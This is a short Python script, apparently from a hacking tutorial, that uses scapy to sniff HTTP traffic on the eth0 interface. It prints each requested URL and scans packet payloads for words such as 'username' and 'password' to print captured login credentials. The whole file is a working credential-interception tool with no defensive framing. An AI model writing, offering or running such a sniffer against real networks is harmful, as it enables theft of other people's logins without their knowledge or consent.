
import scapy.all as scapy
from scapy.layers import http 


def sniffer(interface):
	scapy.sniff(iface=interface, store=False, prn=processSniffedPacket)


def getURL(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def getLogin(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ["username", "user", "login", "password", "pass"]
		for keyword in keywords:
			if keyword in load:
				return load


def processSniffedPacket(packet):
	if packet.haslayer(http.HTTPRequest):
		url = str(getURL(packet))
		print("[+] HTTP Request : " + url)

		loginInfo = getLogin(packet)
		if loginInfo:
			print("\n[+] Username/Password : " + loginInfo + "\n")


sniffer("eth0")